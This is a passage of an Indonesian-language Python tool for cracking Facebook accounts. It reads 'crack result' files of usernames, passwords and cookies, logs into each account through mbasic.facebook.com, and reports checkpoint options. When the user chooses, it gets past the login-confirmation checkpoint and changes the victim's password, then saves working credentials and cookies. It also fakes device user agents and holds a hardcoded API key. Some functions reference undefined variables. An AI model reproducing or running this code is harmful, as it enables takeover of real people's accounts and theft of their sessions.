		prints(Panel(f"""{P2}nama file hasil crack : {nama_file} dan terdapat total akun : {len(totalhasil)}""",width=87,style=f"{color_panel}"))
		for akun in totalhasil:
			user = akun.split("|")[0]
			pw = akun.split("|")[1]
			tree = Tree(" ")
			if folder=="OK":
				cookie = akun.split("|")[2]
				tree.add(f"\r{H2}{user}|{pw}{P2} ")
				tree.add(f"{H2}{cookie}{P2}")
			else:
				tree.add(f"\r{K2}{user}|{pw}{P2} ")
			prints(tree)
		prints(Panel(f"""{P2} berhasil mengecek dan mendapatkan total {len(totalhasil)} akun dari file""",width=87,padding=(0,7),style=f"{color_panel}"))
		exit()
		
	###----------[ GANTI WARNA TEMA ]---------- ###
	def ganti_tema(self):
		prints(Panel(f"""{P2}[{color_text}01{P2}]. ganti warna tema merah  [{color_text}06{P2}]. ganti warna tema pink
[{color_text}02{P2}]. ganti warna tema hijau  [{color_text}07{P2}]. ganti warna tema cyan
[{color_text}03{P2}]. ganti warna tema kuning [{color_text}08{P2}]. ganti warna tema putih
[{color_text}04{P2}]. ganti warna tema biru   [{color_text}09{P2}]. ganti warna tema orange
[{color_text}05{P2}]. ganti warna tema ungu   [{color_text}10{P2}]. ganti warna tema abu2""",width=87,padding=(0,7),style=f"{color_panel}"))
		ask = console.input(f" {H2}• {P2}pilih tema : ")
		if ask in["01","1"]:warna = "[#FF0000]";teks="merah"
		elif ask in["02","2"]:warna = "[#00FF00]";teks="hijau"
		elif ask in["03","3"]:warna = "[#FFFF00]";teks="kuning"
		elif ask in["04","4"]:warna = "[#00C8FF]";teks="biru"
		elif ask in["05","5"]:warna = "[#AF00FF]";teks="ungu"
		elif ask in["06","6"]:warna = "[#FF00FF]";teks="pink"
		elif ask in["07","7"]:warna = "[#00FFFF]";teks="cyan"
		elif ask in["08","8"]:warna = "[#FFFFFF]";teks="putih"
		elif ask in["09","9"]:warna = "[#FF8F00]";teks="orange"
		elif ask in["10"]:warna = "[#AAAAAA]";teks="abu-abu"
		open("data/theme_color","w").write(warna+"|"+warna.replace("[","").replace("]",""))
		prints(Panel(f"""{H2}berhasil mengganti tema ke {teks}, silahkan mulai ulang tools""",width=87,padding=(0,6),style=f"{color_panel}"))
		sys.exit()
			
	###----------[ TAMPILKAN COOKIE ]---------- ###
	def tampil_cookie(self):
		now = datetime.now()
		hari = now.day+int(30)
		if hari > 30:hari = hari-30
		bulan = now.month+1
		if bulan > 12:bulan = bulan-12
		if now.month+1 > 12:tahun = now.year+1
		data = date(year=tahun,month=bulan,day=hari)
		aktif = data.strftime("%d %B %Y")
		console.print(f" {H2}• {P2}aktif sampai : {aktif}")
		prints(Panel(f"""{H2}{self.cookie.get('cookie')}""",width=87,style=f"{color_panel}"))
		sys.exit()
		
###===============> [Opsi-Akun] <================###
import requests, shutil, os, re, bs4, sys, json, time, platform ,random, datetime, subprocess, logging, base64
import hmac, hashlib, urllib, stdiomask, urllib.request, uuid
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from threading import (Thread, Event)
from time import sleep as jeda
from datetime import datetime

ct = datetime.now()
n = ct.month
bulan_ = ['January', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
	if n < 0 or n > 12:
		exit()
	nTemp = n - 1
except ValueError:
	exit()

current = datetime.now()
hari = current.day
bulan = bulan_[nTemp]
tahun = current.year
bullan = current.month

waktu = ("%s-%s-%s"%(hari,bulan,tahun))
bulan12 = {"01": "January", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
P = '\x1b[1;97m' # PUTIH
J = '\033[38;2;255;127;0;1m' # ORANGE
N = '\x1b[0m' # WARNA MATI
acak = [M, H, K, B, U, O, P, J]
warna = random.choice(acak)
til ="\033[0m "

def jalan(keliling):
	for mau in keliling + '\n':
		sys.stdout.write(mau)
		sys.stdout.flush();jeda(0.03)
		
		
ubah_pass = []
pwbaru = []
pwBaru = []
ubahP = []

def file_cp():
	dirs = os.listdir('CP')
	prints(Panel(f"""{P2}copy nama file hasil crack di bawah ini kemudian pastekan di bawah untuk cek opsi""",width=87,style=f"{color_panel}"))
	for file in dirs:
		prints(Panel(f"""{K2}{(file)}""",width=87,style=f"{color_panel}"))
	try:
		prints(Panel(f"""{P2}copy nama file di atas kemudian tempel di bawah ini contoh {M2}: {H2}{waktu}.txt""",width=87,style=f"{color_panel}"))
		opsi()
	except IOError:
		prints(Panel(f"""{M2}Tidak ada file untuk di cek silahkan crack dulu""",width=87,style=f"{color_panel}"))
		Menu().menu()

def opsi():
	CP = ("CP/")
	romi = console.input(f" {H2}⬤ {P2}Tempel atau masukan nama file yang ingin di cek disini : ")
	if romi == "":
		prints(Panel(f"""{K2}isi yang benar""",width=87,style=f"{color_panel}"))
		opsi()
	try:
		file_cp = open(CP+romi, "r").readlines()
	except IOError:
		exit(prints(Panel(f"""{P2}nama file{K2} {(romi)} {P2}tidak di temukan""",width=87,style=f"{color_panel}")))
	prints(Panel(f"""{P2}sebelem melanjutkan hidupkan mode pesawat selama 10 detik""",width=87,style=f"{color_panel}"))
	pw=console.input(f" {H2}⬤ {P2}ubah password ketika tab yes y/n : ")
	if pw in['y','Y']:
		ubah_pass.append("ubah_sandi")
		pw2=console.input(f" {H2}⬤ {P2}Masukan Password baru :{H2} ")
		if len(pw2) <= 5:
			prints(Panel(f"""{K2}Sandi minimal 6 karakter""",width=87,style=f"{color_panel}"))
		else:
			pwbaru.append(pw2)
	prints(Panel(f"""{P2}Total akun {M2}:{H2} {str(len(file_cp))}""",width=87,style=f"{color_panel}"))
	nomor = 0
	for fb in file_cp:
		akun = fb.replace("\n","")
		ngecek  = akun.split("|")
		nomor+=1
		#print("\n%s%s.%s \033[0mlogin akun %s> %s%s"%(H,str(nomor),O,M,K,akun.replace(" *--> ","")));jeda(0.07)
		prints(Panel(f"""{P2}[{H2}{(str(nomor))}{P2}] {P2}Cek sesi akun {K2}>=> {K2}{akun}""",width=87,style=f"{color_panel}"));jeda(0.10)
		try:
			mengecek(ngecek[0].replace("",""), ngecek[1])
		except requests.exceptions.ConnectionError:
			continue
	print("\n")
	Console(width=30).print(Panel(f"[bold green]SELESAI MENGECEK OPSI", style='red'),justify='left')
	console.input(f" {H2}⬤ {P2}Tekan Enter")
	#console.input("%s%s%s [%s Tekan Enter Untuk Kembali%s ] "%(U,til,O,U,O))
	Menu().menu()
	
data = {}
data2 = {}

def mengecek(user,pw):
	global loop,ubah_pass,pwbaru
	session=requests.Session()
	ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
	url = "https://mbasic.facebook.com"
	session.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	soup=bs4.BeautifulSoup(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
	link=soup.find("form",{"method":"post"})
	for x in soup("input"):
		data.update({x.get("name"):x.get("value")})
	data.update({"email":user,"pass":pw})
	urlPost=session.post(url+link.get("action"),data=data)
	response=bs4.BeautifulSoup(urlPost.text, "html.parser")
	if "c_user" in session.cookies.get_dict():
		if "Akun Anda Dikunci" in urlPost.text:
			print("\r%s%s\033[0m akun terkunci sesi new"%(M,til))
		else:
			print("\r%s%s\033[0m akun tidak checkpoint, silahkan anda login "%(til,H))
			open('OK/OK-%s.txt'%(waktu), 'a').write(" %s|%s\n" % (user,pw))
	elif "checkpoint" in session.cookies.get_dict():
		coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
		title=re.findall("\<title>(.*?)<\/title>",str(response))
		link2=response.find("form",{"method":"post"})
		listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
		for x in response("input"):
			if x.get("name") in listInput:
				data2.update({x.get("name"):x.get("value")})
		an=session.post(url+link2.get("action"),data=data2)
		response2=bs4.BeautifulSoup(an.text,"html.parser")
		cek=[cek.text for cek in response2.find_all("option")]
		number=0
		print("\r%s%s \033[0m terdapat %s%s%s \033[0mopsi %s:"%(U,O,P,str(len(cek)),O,M));jeda(0.07)
		if(len(cek)==0):
			if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
				if "ubah_sandi" in ubah_pass:
					dat,dat2={},{}
					but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
					for x in response("input"):
						if x.get("name") in but:
							dat.update({x.get("name"):x.get("value")})
					ubahPw=session.post(url+link2.get("action"),data=dat).text
					resUbah=bs4.BeautifulSoup(ubahPw,"html.parser")
					link3=resUbah.find("form",{"method":"post"})
					but2=["submit[Next]","nh","fb_dtsg","jazoest"]
					if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
						for b in resUbah("input"):
							dat2.update({b.get("name"):b.get("value")})
						dat2.update({"password_new":"".join(pwbaru)})
						an=session.post(url+link3.get("action"),data=dat2)
						coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
						print("\r%s%s\033[0makun one tab, sandi berhasil di ubah \n OK %s%s%s|%s|%s			"%(H,til,N,H,user,pwbaru[0],coki))
						open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s|%s\n" % (H,user,pwbaru[0],coki))
						#cek_apk(coki)
				else:
					print("\r%s%s \033[0m\x1b[1;92mCheckpoint Terbuka, Akun Tap Yes Silahkan Login		"%(H,til))
					tree = Tree(" ",guide_style=f"{color_ok}")
					tree.add(Panel(f"{H2}{ua}{P2}",width=83,padding=(0,2),style=f"{color_ok}"))
					prints(tree)
					open('OK/OK-%s.txt' %(waktu), 'a').write("%s %s|%s|%s\n" % (H,user,pw,coki))
					#cek_apk(coki)
			elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
				print("\r%s\033[0m akun terpasang autentikasi dua faktor			"%(M))
			else:
				print("%s%s\033[0mterjadi kesalahan"%(M,til))
		else:
			if "c_user" in session.cookies.get_dict():
				print("\r%s%s akun tidak checkpoint, silahkan anda login "%(H))
				open('OK/OK-%s.txt' %(waktu), 'a').write("%s%s|%s\n" % (H,user,pw))
		for opsi in range(len(cek)):
			number +=1
			jalan ("  %s%s. %s%s"%(P,str(number),K,cek[opsi]))
	elif "login_error" in str(response):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print("%s %s"%(M,oh))
	else:
		tree = Tree(" ",guide_style=f"{color_panel}")
		tree.add(Panel(f"{O2}login gagal, silahkan cek kembali id dan kata sandi{P2}",width=83,padding=(0,2),style=f"{color_panel}"))
		prints(tree)
		  
def scarpping_ua():
    # Url & Headers website #
    
    
    url = "https://api.apilayer.com/user_agent/generate?android=true&chrome=true"
    header = {"apikey": "2ZxXnjQByF6rPu3GM5DtcEmrJfKqB5xL"}
    
    # Main menu #
    
  #  os.system('clear')
    try:
        response = requests.get(url,headers=header)
        if response.status_code == 200:
            uascrap.append(response.json()['ua'])
        else:
            uascrap.append("Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36")
    except requests.exceptions.ConnectionError:
        uascrap.append("Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36")
		
###----------[ BAGIAN SESSION HEADERS DAN USER AGENT ]---------- ###
class Session:
	
	###----------[ GENERATE USER AGENT CRACK ]---------- ###
	def generate_ugent(self):
		versi_android = random.randint(4,12)
		versi_chrome = str(random.randint(300,325))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
		versi_app = random.randint(410000000,499999999)
		device = random.choice(["M2007J3SY Build/RXU34Y","NEO-X7-216A Build/XRN68H","STK-LX3 Build/HUAWEISTK-LX3","BTV-W09 Build/HUAWEIBEETHOVEN-W09","CLT-AL00 Build/HUAWEICLT-AL00","LYA-AL10 Build/HUAWEILYA-AL10","ELE-L29 Build/HUAWEIELE-L29","DIG-AL00 Build/HUAWEIDIG-AL00","EVA-L09 Build/HUAWEIEVA-L09","5.1.1; F1 Build/LMY47V"])
		density = random.choice(["{density=3.0,width=1080,height=1920}","{density=2.0,width=720,height=1412}","{density=1.5, width=480, height=800}"])
		ugent = f"Davik/2.1.0 (Linux; U; Android {android_version}; {model_device} Build/{build_device}) [FBAN/MessengerLite;FBAV/{versi_chrome};FBPN/com.facebook.mlite;FBLC/{language};FBBV/{versi_app};FBCR/{simcard};FBMF/{merk_device};FBBD/{brand_device};FBDV/{model_device};FBSV/{android_version};FBCA/{cpu_device};FBDM/"+str(large_device)+";]"
		return ugent		
		
if __name__=="__main__":
	try:os.mkdir("OK")
	except:pass
	try:os.mkdir("CP")
	except:pass
	try:os.mkdir("data")
	except:pass
	Menu().menu()
#THANKS TO SUNSHINE ID